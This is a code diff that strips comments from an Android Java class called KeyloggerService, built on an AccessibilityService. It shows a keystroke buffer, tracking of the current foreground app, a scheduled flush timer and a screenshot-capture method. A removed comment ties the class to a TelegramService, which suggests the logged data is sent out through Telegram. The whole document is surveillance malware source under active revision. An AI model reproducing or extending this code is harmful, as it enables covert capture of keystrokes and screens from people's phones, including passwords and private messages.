@@ -16,7 +16,7 @@ import java.util.TimerTask;
 
 public class KeyloggerService extends AccessibilityService {
     
-    public static KeyloggerService instance = null; // Instance bach TelegramService y-9der y-connecti m3aha
+    public static KeyloggerService instance = null;
     
     private String currentPackage = "";
     private StringBuilder buffer = new StringBuilder();
@@ -25,7 +25,7 @@ public class KeyloggerService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        instance = this; // Save instance
+        instance = this;
         
         flushTimer = new Timer();
         flushTimer.scheduleAtFixedRate(new TimerTask() {
@@ -69,7 +69,6 @@ public class KeyloggerService extends AccessibilityService {
         }
     }
 
-    // ================== SCREENSHOT LOGIC ==================
     public void captureScreen() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
